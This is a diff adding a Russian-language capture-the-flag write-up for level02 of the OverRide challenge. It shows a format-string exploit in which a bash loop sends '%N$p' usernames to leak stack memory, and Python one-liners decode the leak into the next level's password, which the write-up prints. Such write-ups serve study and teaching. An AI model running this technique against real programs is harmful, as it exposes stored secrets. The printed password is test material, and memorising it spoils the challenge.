@@ -1,0 +1,91 @@
+ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
+
+No RELRO   - нет защиты от перемещения
+No canary found - нет канареечной защиты
+NX disabled - Стек может быть выполнен, и данные в стеке также могут быть выполнены как код.
+No PIE - нет рандомизации базового адреса
+No RPATH  - нет жестких путей загрузки библиотек
+No RUNPATH - нет жестких путей загрузки библиотек
+
+No PIE опечатка или еще какая то защита?  С адресами фигня
+
+readelf  -p .rodata level02
+
+String dump of section '.rodata':
+  [     8]  r
+  [     a]  /home/users/level03/.pass
+  [    28]  ERROR: failed to open password file^J
+  [    50]  ERROR: failed to read password file^J
+  [    78]  ===== [ Secure Access System v1.0 ] =====
+  [    a8]  /***************************************\
+  [    d8]  | You must login to access this system. |
+  [   108]  \**************************************/
+  [   131]  --[ Username:
+  [   140]  --[ Password:
+  [   150]  *****************************************
+  [   17a]  Greetings, %s!^J
+  [   18a]  /bin/sh
+  [   192]   does not have access!
+
+  В теории есть system("/bin/sh") но не понятно как это можно использовать.
+
+   ltrace ./level02
+__libc_start_main(0x400814, 1, 0x7fffffffe6e8, 0x400ac0, 0x400b50 <unfinished ...>
+fopen("/home/users/level03/.pass", "r")                                   = 0
+fwrite("ERROR: failed to open password f"..., 1, 36, 0x7ffff7dd4180ERROR: failed to open password file
+)      = 36
+
+в ходе анализа становится понятно что программа считывает пароль и сохраняет в буфере
+в ходе выполненя этот самый пароль сравнивается с введенным паролем
+    /*
+        0x0000000000400a4a <+566>:	lea    rcx,[rbp-0x110]
+        0x0000000000400a51 <+573>:	lea    rax,[rbp-0xa0]
+        0x0000000000400a58 <+580>:	mov    edx,0x29
+        0x0000000000400a5d <+585>:	mov    rsi,rcx
+        0x0000000000400a60 <+588>:	mov    rdi,rax
+        0x0000000000400a63 <+591>:	call   0x400670 <strncmp@plt>
+        0x0000000000400a68 <+596>:	test   eax,eax
+        0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>
+    */
+
+Видно, что у адресов относительные смещения. Это справедливо когда включена защита PIE
+
+в случае неудачи выводится введнное имя вместе с does not have access!
+
+если ввести символы форматирования принтф то становится понятно что для вывода имени использууется принтф.
+
+--[ Username: %x
+--[ Password: 1234
+*****************************************
+ffffe4f0 does not have access!
+
+недолго думая распечатываем память
+
+for((i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
+
+так как пароль расположен последовательно находим интересный участок
+
+22 - 0x756e505234376848 does not have access!
+23 - 0x45414a3561733951 does not have access!
+24 - 0x377a7143574e6758 does not have access!
+25 - 0x354a35686e475873 does not have access!
+26 - 0x48336750664b394d does not have access!
+
+в 16-тиричной системе распечатан пароль
+
+Приводим в нормальный вид
+python -c 'print "756e505234376848".decode("hex")[::-1]'  -> Hh74RPnu
+python -c 'print "45414a3561733951".decode("hex")[::-1]'  -> Q9sa5JAE
+python -c 'print "377a7143574e6758".decode("hex")[::-1]'  -> XgNWCqz7
+python -c 'print "354a35686e475873".decode("hex")[::-1]'  -> sXGnh5J5
+python -c 'print "48336750664b394d".decode("hex")[::-1]'  -> M9KfPg3H
+
+складываем и получаем
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+su level03
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
+level03@OverRide:~$
